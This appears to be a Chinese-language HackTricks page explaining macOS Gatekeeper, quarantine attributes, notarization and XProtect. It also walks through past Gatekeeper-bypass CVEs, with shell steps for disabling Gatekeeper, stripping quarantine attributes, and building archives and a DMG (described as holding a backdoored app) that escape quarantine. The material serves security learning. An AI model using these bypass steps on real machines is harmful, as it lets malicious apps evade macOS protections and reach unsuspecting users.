# macOS Gatekeeper / Quarantine / XProtect

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 如果您在**网络安全公司**工作，想在**HackTricks**中看到您的**公司广告**，或者想要访问**最新版本的PEASS或下载HackTricks的PDF**？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs**](https://opensea.io/collection/the-peass-family)系列。
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)。
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
*
* .

</details>

## Gatekeeper

**Gatekeeper**是为Mac操作系统开发的安全功能，旨在确保用户**只运行可信的软件**。它通过**验证**用户从**App Store外部来源**下载并尝试打开的软件（如应用程序、插件或安装包）来发挥作用。

Gatekeeper的关键机制在于其**验证**过程。它检查下载的软件是否由**认可的开发者签名**，确保软件的真实性。此外，它确定软件是否已被Apple**公证**，确认它没有已知的恶意内容，并且在公证后没有被篡改。

此外，Gatekeeper通过**提示用户批准首次打开**下载的软件来加强用户控制和安全性。这一安全措施有助于防止用户无意中运行可能有害的可执行代码，他们可能误以为是无害的数据文件。

### 应用程序签名

应用程序签名，也称为代码签名，是Apple安全基础设施的关键组成部分。它们用于**验证软件作者的身份**（开发者），并确保自上次签名以来代码未被篡改。

以下是它的工作原理：

1. **签署应用程序：**当开发者准备分发他们的应用程序时，他们使用私钥**对应用程序进行签名**。这个私钥与Apple在他们加入Apple开发者计划时发给开发者的**证书相关联**。签名过程包括创建应用程序所有部分的加密散列，并用开发者的私钥加密此散列。
2. **分发应用程序：**然后将签名的应用程序连同开发者的证书一起分发给用户，证书中包含相应的公钥。
3. **验证应用程序：**当用户下载并尝试运行应用程序时，他们的Mac操作系统使用开发者证书中的公钥来解密散列。然后根据应用程序的当前状态重新计算散列，并将其与解密后的散列进行比较。如果它们匹配，这意味着自开发者签名以来**应用程序未被修改**，系统允许应用程序运行。

应用程序签名是Apple的Gatekeeper技术的重要部分。当用户尝试**打开从互联网下载的应用程序**时，Gatekeeper会验证应用程序签名。如果它使用Apple颁发给已知开发者的证书签名，并且代码未被篡改，Gatekeeper允许应用程序运行。否则，它会阻止应用程序并提醒用户。

从macOS Catalina开始，**Gatekeeper还会检查应用程序是否已被Apple公证**，增加了一层安全保障。公证过程检查应用程序是否存在已知的安全问题和恶意代码，如果这些检查通过，Apple会向应用程序添加一个Gatekeeper可以验证的票据。

#### 检查签名

当检查某些**恶意软件样本**时，您应该始终**检查二进制文件的签名**，因为签名它的**开发者**可能已经与**恶意软件**有**关联**。
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### 公证

苹果的公证过程是一项额外的安全措施，用于保护用户免受潜在有害软件的影响。它涉及**开发者提交他们的应用程序给**苹果的公证服务进行检查，这个服务不应与应用审核混淆。这项服务是一个**自动化系统**，它会审查提交的软件是否含有**恶意内容**以及代码签名是否存在潜在问题。

如果软件在检查中**通过**而没有引起任何关注，公证服务会生成一个公证票据。然后要求开发者**将这个票据附加到他们的软件上**，这个过程被称为'钉附'。此外，公证票据也会在线上发布，苹果的安全技术Gatekeeper可以访问它。

当用户首次安装或执行软件时，无论是钉附在可执行文件上还是在线上找到的公证票据的存在，都会**告知Gatekeeper该软件已经由苹果公证**。因此，Gatekeeper在初始启动对话框中显示描述性消息，指出软件已经经过苹果的恶意内容检查。这个过程因此增强了用户对他们在系统上安装或运行的软件安全性的信心。

### 枚举GateKeeper

GateKeeper既是**几个防止不受信任应用执行的安全组件**，也是**其中一个组件**。

可以通过以下方式查看GateKeeper的**状态**：
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
请注意，GateKeeper 签名检查仅对**具有隔离属性的文件**执行，而不是对每个文件执行。
{% endhint %}

GateKeeper 将根据**偏好设置和签名**检查二进制文件是否可以执行：

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

保存此配置的数据库位于 **`/var/db/SystemPolicy`**。您可以使用以下命令作为 root 检查此数据库：
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
请注意，第一条规则以“**App Store**”结束，第二条规则以“**Developer ID**”结束，并且在前面的图片中，它被**启用以执行来自App Store和已识别开发者的应用程序**。\
如果您将该设置**修改**为App Store，那么“**Notarized Developer ID**”规则将会**消失**。

还有成千上万的**GKE类型**规则：
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
这些是来自 **`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** 和 **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`** 的哈希值

或者，您可以使用以下命令列出前面的信息：
```bash
sudo spctl --list
```
选项 **`--master-disable`** 和 **`--global-disable`** 用于 **`spctl`** 将完全**禁用**这些签名检查：
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
当完全启用时，将出现一个新选项：

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

可以**检查一个应用是否会被GateKeeper允许**通过：
```bash
spctl --assess -v /Applications/App.app
```
可以通过以下方式在GateKeeper中添加新规则以允许执行特定应用程序：
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### 隔离文件

当**下载**应用程序或文件时，特定的macOS **应用程序**，如网页浏览器或电子邮件客户端，会**附加一个扩展文件属性**，通常被称为“**隔离标志**”。这个属性作为一种安全措施，用来**标记文件**来自不受信任的来源（互联网），并可能携带风险。然而，并非所有应用程序都会附加这个属性，例如，常见的BitTorrent客户端软件通常会绕过这个过程。

**隔离标志的存在在用户尝试执行文件时向macOS的Gatekeeper安全功能发出信号**。

在**没有隔离标志**的情况下（如通过某些BitTorrent客户端下载的文件），Gatekeeper的**检查可能不会执行**。因此，用户在打开来自不太安全或未知来源的下载文件时应谨慎行事。

{% hint style="info" %}
**检查**代码签名的**有效性**是一个**资源密集型**的过程，包括生成代码及其所有捆绑资源的加密**哈希**。此外，检查证书有效性涉及对苹果服务器进行**在线检查**，以查看它在签发后是否已被撤销。因此，完整的代码签名和公证检查**不切实际地在每次启动应用时运行**。

因此，这些检查**仅在执行带有隔离属性的应用时运行。**
{% endhint %}

{% hint style="warning" %}
这个属性必须由**创建/下载**文件的应用程序**设置**。

然而，沙盒化的文件将对它们创建的每个文件设置此属性。非沙盒化的应用程序可以自行设置，或者在**Info.plist**中指定[**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information_property_list/lsfilequarantineenabled?language=objc)键，这将使系统在创建的文件上设置`com.apple.quarantine`扩展属性，
{% endhint %}

可以**检查其状态并启用/禁用**（需要root权限）：
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
你也可以**查找文件是否具有隔离扩展属性**，使用：
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
检查**扩展** **属性**的**值**，并找出写入隔离属性的应用程序：
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
实际上，一个进程“可以对其创建的文件设置隔离标志”（我尝试在创建的文件中应用 USER\_APPROVED 标志，但它不会应用）：

<details>

<summary>源代码应用隔离标志</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

并**移除**该属性:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
```bash
xattr -r -d com.apple.quarantine /path/to/directory
```

这个命令会递归地删除指定目录下所有文件的隔离属性。
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

隔离信息也存储在由LaunchServices管理的中央数据库中，位于 **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**。

#### **Quarantine.kext**

内核扩展只能通过系统上的**内核缓存**获得；然而，你_可以_从 **https://developer.apple.com/** 下载**内核调试工具包**，其中包含了该扩展的符号化版本。

### XProtect

XProtect是macOS内置的**反恶意软件**功能。XProtect会在应用程序首次启动或修改时**检查其数据库中的已知恶意软件和不安全文件类型**。当你通过某些应用程序下载文件时，例如Safari、Mail或Messages，XProtect会自动扫描该文件。如果它与数据库中的任何已知恶意软件匹配，XProtect将**阻止文件运行**并向你警告威胁。

Apple会**定期更新**XProtect数据库中的恶意软件定义，这些更新会自动下载并安装在你的Mac上。这确保了XProtect始终与最新的已知威胁保持同步。

然而，值得注意的是，**XProtect不是一个全功能的防病毒解决方案**。它只检查特定列表中的已知威胁，并不像大多数防病毒软件那样执行访问时扫描。

你可以通过以下命令获取最新XProtect更新信息：

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect 位于 SIP 保护位置 **/Library/Apple/System/Library/CoreServices/XProtect.bundle**，在包内部可以找到 XProtect 使用的信息：

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**：允许具有这些 cdhashes 的代码使用旧版权限。
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**：列出了通过 BundleID 和 TeamID 不允许加载的插件和扩展，或指示最低版本。
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**：Yara 规则用于检测恶意软件。
* **`XProtect.bundle/Contents/Resources/gk.db`**：SQLite3 数据库，包含被阻止的应用程序的哈希和 TeamIDs。

请注意，还有另一个与 XProtect 相关的应用程序位于 **`/Library/Apple/System/Library/CoreServices/XProtect.app`**，它不涉及 Gatekeeper 过程。

### 非 Gatekeeper

{% hint style="danger" %}
请注意，Gatekeeper **并不是每次** 执行应用程序时都会执行，只有 _**AppleMobileFileIntegrity**_ (AMFI) 会在你执行已经被 Gatekeeper 执行和验证过的应用程序时，**验证可执行代码签名**。
{% endhint %}

因此，之前可以执行应用程序以通过 Gatekeeper 缓存它，然后**修改应用程序的非可执行文件**（如 Electron asar 或 NIB 文件），如果没有其他保护措施，应用程序将会**执行**并包含**恶意**添加。

然而，现在这已经不可能了，因为 macOS **阻止修改**应用程序包内的文件。所以，如果你尝试 [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md) 攻击，你会发现由于在通过 Gatekeeper 缓存应用程序后无法修改包，因此无法滥用它。如果你更改例如 Contents 目录的名称为 NotCon（如漏洞中所示），然后执行应用程序的主二进制文件以通过 Gatekeeper 缓存它，它将触发错误并不会执行。

## Gatekeeper 绕过

任何绕过 Gatekeeper 的方法（设法让用户下载某些东西并在 Gatekeeper 应该禁止时执行它）都被视为 macOS 中的漏洞。以下是过去允许绕过 Gatekeeper 的技术分配的一些 CVE：

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

通过 **Archive Utility** 解压时，路径长度超过 886 个字符的文件会失败继承 com.apple.quarantine 扩展属性，使得可能**绕过 Gatekeeper**。

查看[**原始报告**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)获取更多信息。

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

当使用 **Automator** 创建应用程序时，关于它需要执行的信息在 `application.app/Contents/document.wflow` 中，而不是在可执行文件中。可执行文件只是一个通用的 Automator 二进制文件，称为 **Automator Application Stub**。

因此，你可以使 `application.app/Contents/MacOS/Automator\ Application\ Stub` **通过符号链接指向系统内的另一个 Automator Application Stub**，它将执行 `document.wflow` 中的内容（你的脚本）**而不触发 Gatekeeper**，因为实际的可执行文件没有隔离 xattr。&#x20;

预期位置示例：`/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

查看[**原始报告**](https://ronmasas.com/posts/bypass-macos-gatekeeper)获取更多信息。

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

在这个绕过中，创建了一个 zip 文件，从 `application.app/Contents` 开始压缩应用程序，而不是从 `application.app` 开始。因此，**隔离 attr** 被应用于所有来自 `application.app/Contents` 的**文件**，但**不适用于 `application.app`**，这是 Gatekeeper 正在检查的，所以 Gatekeeper 被绕过了，因为当触发 `application.app` 时，它**没有隔离属性**。
```bash
zip -r test.app/Contents test.zip
```
查看[**原始报告**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)获取更多信息。

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

即使组件不同，利用这个漏洞的方法与之前的非常相似。在这种情况下，我们将从 **`application.app/Contents`** 生成一个苹果档案，因此当通过**档案实用工具**解压时，**`application.app`** 不会获得隔离属性。
```bash
aa archive -d test.app/Contents -o test.app.aar
```
查看[**原始报告**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/)以获取更多信息。

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** 可用于防止任何人在文件中写入属性：
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
此外，**AppleDouble** 文件格式会复制文件及其ACEs。

在[**源代码**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)中可以看到，存储在名为 **`com.apple.acl.text`** 的xattr内的ACL文本表示形式将被设置为解压缩文件的ACL。因此，如果你将一个应用程序压缩成带有阻止其他xattrs写入的ACL的**AppleDouble**文件格式的zip文件...隔离xattr就没有被设置到应用程序中：

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

查看[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)以获取更多信息。

注意，这也可能通过AppleArchives被利用：
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

发现**Google Chrome**由于macOS内部问题**没有为下载的文件设置隔离属性**。

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble文件格式通过以`._`开头的单独文件存储文件属性，这有助于**在macOS机器之间**复制文件属性。然而，注意到解压AppleDouble文件后，以`._`开头的文件**没有被赋予隔离属性**。

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

能够创建一个不会设置隔离属性的文件，这就**可能绕过Gatekeeper。** 技巧是使用AppleDouble命名约定（以`._`开头）**创建一个DMG文件应用程序**，并创建一个**可见文件作为指向这个隐藏**文件的符号链接，而这个隐藏文件没有隔离属性。\
当**dmg文件被执行**时，由于它没有隔离属性，它将**绕过Gatekeeper**。
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### 防止隔离 xattr

如果在 ".app" 包中没有添加隔离 xattr，执行时**Gatekeeper 不会被触发**。

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>从零开始学习 AWS 黑客攻击！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 HackTricks 中看到您的**公司广告**或**下载 HackTricks 的 PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来**分享您的黑客技巧。

</details>
